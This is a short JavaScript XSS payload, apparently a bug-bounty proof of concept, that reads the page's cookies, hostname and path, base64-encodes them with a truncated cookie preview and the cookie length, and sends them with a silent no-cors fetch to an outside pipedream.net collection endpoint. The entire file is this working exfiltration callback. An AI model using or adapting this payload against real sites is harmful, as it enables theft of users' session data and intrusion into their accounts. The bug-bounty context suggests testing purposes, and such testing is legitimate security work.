(() => {
  const ENDPOINT_BASE = "https://eolxijmljxeogue.m.pipedream.net/reaper/bbp-assesment";
  const MAX_COOKIE_PREVIEW = 32;   // n'envoie qu'un aperçu
  const MAX_B64_LENGTH = 700;      // borne dure pour éviter URL trop longue

  const cookieRaw = document.cookie || "";
  const data = {
    proof: "xss-callback-test",
    ts: Date.now(),
    host: window.location.hostname,
    path: window.location.pathname,
    cookie_len: cookieRaw.length,
    cookie_preview: cookieRaw.slice(0, MAX_COOKIE_PREVIEW) // pas le cookie complet
  };

  const json = JSON.stringify(data);
  const b64 = btoa(unescape(encodeURIComponent(json))).slice(0, MAX_B64_LENGTH);

  fetch(`${ENDPOINT_BASE}/${b64}/${data.ts}`, {
    method: "GET",
    mode: "no-cors"
  }).catch(() => {});
})();
